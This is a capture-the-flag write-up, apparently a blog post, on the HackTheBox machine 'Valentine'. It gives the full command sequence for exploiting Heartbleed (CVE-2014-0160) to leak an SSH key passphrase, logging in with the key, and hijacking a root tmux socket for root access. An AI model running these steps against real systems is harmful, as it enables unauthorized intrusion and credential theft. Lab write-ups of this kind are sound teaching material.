---
title: "Valentine"
date: 2026-07-03 07:00:00 -0500
categories: [HackTheBox, Linux]
tags: [hackthebox, linux, easy, heartbleed, openssl, cve-2014-0160, memory-disclosure, ssh-key, tmux, privilege-escalation]
description: "An HTTPS service running OpenSSL 1.0.1 is vulnerable to Heartbleed (CVE-2014-0160), which leaks the passphrase for an encrypted RSA private key found in a world-accessible /dev/ directory, granting SSH access as hype."
---
## Overview

Valentine is an easy Linux machine. The web server exposes a hex-encoded encrypted RSA private key in a public `/dev/` directory while also running OpenSSL 1.0.1 — vulnerable to [CVE-2014-0160](https://nvd.nist.gov/vuln/detail/CVE-2014-0160) (Heartbleed). Repeatedly triggering the Heartbleed read leak against the HTTPS service recovers the POST body `text=heartbleedbelievethehype` from server memory — the passphrase for the SSH key — yielding a shell as `hype`. Root has a persistent `tmux` session bound to a world-accessible Unix socket at `/.devs/dev_sess`; attaching to it executes arbitrary commands as root.

## Machine Matrix

<div style="text-align:center;margin:1.5rem 0;">
<svg viewBox="-60 0 420 300" width="420" style="max-width:100%;font-family:sans-serif;font-size:13px;">
  <polygon points="150.0,40.0 254.6,116.0 214.7,239.0 85.3,239.0 45.4,116.0" fill="none" stroke="#888" stroke-opacity="0.4"/>
  <polygon points="150.0,76.7 219.7,127.4 193.1,209.3 106.9,209.3 80.3,127.4" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <polygon points="150.0,113.4 184.8,138.7 171.5,179.6 128.5,179.6 115.2,138.7" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <g stroke="#888" stroke-opacity="0.4">
    <line x1="150" y1="150" x2="150.0" y2="40.0"/>
    <line x1="150" y1="150" x2="254.6" y2="116.0"/>
    <line x1="150" y1="150" x2="214.7" y2="239.0"/>
    <line x1="150" y1="150" x2="85.3" y2="239.0"/>
    <line x1="150" y1="150" x2="45.4" y2="116.0"/>
  </g>
  <polygon points="150.0,84.0 254.5,116.0 214.5,239.0 137.1,167.8 108.2,136.4" fill="#9fef00" fill-opacity="0.3" stroke="#9fef00" stroke-width="2"/>
  <g fill="currentColor" text-anchor="middle">
    <text x="150" y="28">Enumeration</text>
    <text x="278" y="112" text-anchor="start">Real-Life</text>
    <text x="226" y="258" text-anchor="start">CVE</text>
    <text x="74" y="258" text-anchor="end">Custom Exploitation</text>
    <text x="22" y="112" text-anchor="end">CTF-like</text>
  </g>
</svg>
</div>

High Real-Life and CVE scores reflect that Heartbleed is a genuine, weaponized critical vulnerability still found in unpatched production environments; the tmux socket misconfiguration is equally realistic.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 22/tcp | OpenSSH | SSH — used for foothold |
| 80/tcp | Apache httpd | HTTP — hosts encode/decode app, `/dev/` directory listing |
| 443/tcp | Apache httpd (SSL) | HTTPS — OpenSSL 1.0.1, Heartbleed-vulnerable |

```bash
nmap -p- --min-rate=1000 -T4 -Pn 10.10.10.X
nmap -p22,80,443 -sC -sV -Pn 10.10.10.X
```

The HTTPS service reports OpenSSL 1.0.1, which is the version range affected by Heartbleed. The site theme is Valentine-themed with a bleeding heart image — a direct hint.

## Enumeration

Browsing port 80 reveals an encode/decode application. The `/dev/` directory is world-accessible and lists two files:

```bash
curl -s http://10.10.10.X/dev/
curl -s http://10.10.10.X/dev/hype_key > hype_key.hex
curl -s http://10.10.10.X/dev/notes.txt
```

`hype_key` is a hex dump of an AES-128-CBC encrypted RSA private key. `notes.txt` hints the encoder/decoder is not finished. Decode the hex to recover the PEM:

```bash
cat hype_key.hex | tr -d ' \n' | xxd -r -p > hype.key
head -3 hype.key
```

The key header confirms encryption (`Proc-Type: 4,ENCRYPTED`, `DEK-Info: AES-128-CBC`). A passphrase is needed. Confirm Heartbleed on port 443:

```bash
nmap -p 443 --script ssl-heartbleed 10.10.10.X
```

Output: `VULNERABLE` — the service leaks process memory on demand.

## Foothold

The application POSTs `text=heartbleedbelievethehype` to `/encode.php` over HTTPS. When that request is in process memory, a Heartbleed read leaks the POST body. Run the public exploit repeatedly until the base64-encoded POST body appears:

```bash
for i in $(seq 1 50); do
  python2 /usr/share/exploitdb/exploits/multiple/remote/32764.py 10.10.10.X -p 443 2>/dev/null
done | strings | grep -oP '[a-zA-Z0-9+/=]{20,}' | sort | uniq -c | sort -rn | head -20
```

Decode the recurring base64 candidate to recover the passphrase `heartbleedbelievethehype`. Verify it against the encrypted key:

```bash
openssl rsa -in hype.key -passin pass:heartbleedbelievethehype -check 2>&1 | head -1
```

Output: `RSA key ok`. Convert to an unencrypted key and SSH as `hype`:

```bash
openssl rsa -in hype.key -passin pass:heartbleedbelievethehype -traditional -out hype_rsa.key
chmod 600 hype_rsa.key
ssh -i hype_rsa.key -o PubkeyAcceptedKeyTypes=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa hype@10.10.10.X
```

Shell lands as `uid=1000(hype)`.

## User flag

```bash
cat ~/user.txt   # HTB{...}
```

Foothold lands directly as `hype`, who owns `user.txt` — no lateral movement required.

## Privilege Escalation

Enumerate running processes from the `hype` shell:

```bash
ps aux | grep tmux
```

Output shows root is running `/usr/bin/tmux -S /.devs/dev_sess`. The socket is readable by `hype`. Send a command to the root tmux server to read the root flag:

```bash
tmux -S /.devs/dev_sess new-window 'cat /root/root.txt > /tmp/r.txt && chmod 777 /tmp/r.txt'
cat /tmp/r.txt
```

Alternatively, attach interactively:

```bash
tmux -S /.devs/dev_sess attach
```

This gives a full interactive root shell. The [CWE-732](https://cwe.mitre.org/data/definitions/732.html) (incorrect permission assignment for critical resource) on the socket combined with [CWE-269](https://cwe.mitre.org/data/definitions/269.html) (improper privilege management) is the root cause — the socket should be `chmod 700` and owned exclusively by root.

## Root flag

```bash
cat /root/root.txt   # HTB{...}
```

Full root compromise achieved via the world-accessible tmux socket bound to root's persistent session.
